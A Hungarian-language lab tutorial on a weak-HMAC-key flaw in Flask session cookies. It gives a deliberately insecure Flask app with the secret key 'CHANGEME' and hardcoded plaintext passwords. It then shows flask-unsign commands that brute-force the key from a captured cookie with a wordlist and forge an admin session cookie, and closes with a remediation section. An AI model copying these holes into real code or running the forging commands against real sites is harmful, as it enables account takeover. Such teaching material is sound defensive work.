# HMAC gyengesége

A HMAC (Hash-based Message Authentication Code) egy olyan eljárás, aminek
során a tárolt adatot nem titkosítjuk, hanem egy titkos kulccsal kiegészítve
kriptográfiai hash-t képezünk belőle és azzal együtt tároljuk. A webalkalmazás
ezt a hash-t ellenőrzi. Az adat átírásával a titkos kulcs ismerete nélkül
a felhasználó nem tudja képezni a hash-t. A visszajátszásos támadás elkerülése
érdekében a HMAC bemenete egy időbélyeg is.

Gyenge titkos kulcs esetén egy érvényes cookie megszerzésével a gyakori
titkos kulcsok a cookie-ra rápróbálhatóak, így a titkos kulcs megszerezhető.

## Rendszerterv

A sebezhetőséget egy Flask webalkalmazással demonstráljuk, amit a szokásos módon
egy venv-be telepítünk:

```bash
sudo apt install python3-venv
python3 -m venv xss
cd xss
. bin/activate
pip install flask
```

Ezután elhelyezhetjük az egyfájlos Python Flask webalkalmazást az `app.py`
fájlban.

```bash
cat > app.py
```

Ez az `app.py` fájl tartalma:
```python
from flask import Flask, request, redirect, url_for, session, make_response, render_template_string

app = Flask(__name__)

app.secret_key = 'CHANGEME'

users = {
        "user": "123",
        "admin": "securePW"
        }

@app.route('/')
def index():
    if 'username' in session:
        username = session['username']
        return f"""
        <h2>Welcome, {username}!</h2>
        <p><a href="/logout">Logout</a></p>
        """

    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        try:
            print("AAAA")
            if users[username] != password:
                print("BBBB")
                raise Exception
            print("CCCC")
            session['username'] = username
            print("ZZZZ")
            return redirect(url_for('index'))
        except Exception as e:
            print(e)
            return redirect(url_for('login'))

    # GET → show login form
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login - Insecure Session Demo</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 420px; margin: 80px auto; }
            input { display: block; margin: 12px 0; width: 100%; padding: 8px; }
            button { padding: 10px 20px; background: #0066cc; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <h2>Login</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Username" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </body>
    </html>
    ''')


@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))


if __name__ == '__main__':
    app.run(host = "0.0.0.0", port = 5000)
```

## A támadás menete

A `user` nevű felhasználóval be tudunk jelentkezni (jelszava: `123`). A kapott cookie alapján
a `flask-unsign` nevű célprogrammal próbálhatjuk meg megfejteni a titkos kulcsot. Ehhez
szükséges a program telepítése, amit egy virtualenv környezetben tudunk megtenni:

```bash
pip install flask-unsign
```

Illetve szükséges még egy szótárfájl is, amit ebből a repositoryból tudunk letölteni:

[https://github.com/Paradoxis/Flask-Unsign-Wordlist](https://github.com/Paradoxis/Flask-Unsign-Wordlist)

Az egyes lehetséges szavakat a következő módon tudjuk rápróbálni a cookie-ra:

```bash
flask-unsign --unsign --cookie="eyJ1c2VybmFtZSI6InVzZXIifQ.acGM0Q.MyOHr0Usq17UHRCFSu75jpucY5o" --wordlist=
https://github.com/Paradoxis/Flask-Unsign-Wordlist```

Végül egy saját cookie-t is generálhatunk:

```bash
./flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'CHANGEME'
```

## A sérülékenység javítása

A sérülékenység abból ered, hogy a titkos kulcs egy szótári szó. Egy megfelelően hosszú véletlenszerű byte
szekbencia kitalálása közel lehetetlen lenne még úgy is, hogy egy érvényes cookie megszerzése után
a támadó a támadott rendszerrel való interakció nélkül próbálhat ki kulcsokat.

Fontos az is, hogy a használt titkos kulcs más módon (például egy esetleges SSTI-vel, vagy
a forrásfájlok olvashatóságával) se tudjon kiszivárogni.

